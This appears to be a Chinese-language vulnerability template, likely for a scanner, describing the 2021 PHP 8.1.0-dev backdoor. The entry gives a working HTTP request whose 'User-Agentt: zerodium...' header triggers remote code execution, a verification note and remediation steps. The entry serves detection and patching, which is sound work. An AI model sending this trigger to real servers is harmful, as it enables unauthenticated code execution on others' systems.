---
id: PHP-8.1-BACKDOOR
title: PHP 8.1.0-dev User-Agentt 后门导致远程代码执行漏洞
product: php
vendor: PHP
version_affected: "8.1.0-dev"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["PHP"]
---

## 漏洞描述

PHP 8.1.0-dev 版本在2021年3月28日被植入后门，当服务器存在该后门时，攻击者可以通过发送 User-Agentt 头（注意是两个t）执行任意代码。

## 影响版本

- PHP 8.1.0-dev

## 前置条件

- 无需认证
- 服务器使用被植入后门的 PHP 8.1.0-dev 版本

## 利用步骤

1. 发送带有后门触发头的请求

## Payload

```http
GET / HTTP/1.1
Host: target:8080
User-Agentt: zerodiumvar_dump(233*233);

```

## 验证方法

```bash
# 响应中会显示 var_dump 的输出
```

## 修复建议

1. 升级到官方PHP 8.1正式版
2. 检查服务器是否使用了被污染的PHP版本
3. 从可信来源重新安装PHP
